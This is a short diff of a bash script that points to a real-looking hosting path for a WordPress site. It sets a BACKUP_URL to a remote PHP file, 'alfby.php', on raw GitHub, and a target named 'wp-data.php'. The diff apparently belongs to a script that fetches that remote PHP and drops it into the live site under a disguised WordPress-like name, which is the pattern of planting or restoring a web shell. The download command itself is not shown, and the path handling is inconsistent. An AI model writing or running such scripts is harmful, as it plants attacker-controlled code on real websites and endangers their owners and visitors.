@@ -1,10 +1,10 @@
 #!/bin/bash
 
 # Set the path to the folder containing the index.php file
-FOLDER_PATH="/path/to/your/folder"
+FOLDER_PATH="/home/u0256282/public_html/pramukalia.com/wp-data.php"
 
 # Set the path to the index.php file
-FILE_PATH="$FOLDER_PATH/index.php"
+FILE_PATH="$FOLDER_PATH/wp-data.php"
 
 # Set the URL to the backup file
 BACKUP_URL="https://raw.githubusercontent.com/slavination/odinastic/main/alfby.php"
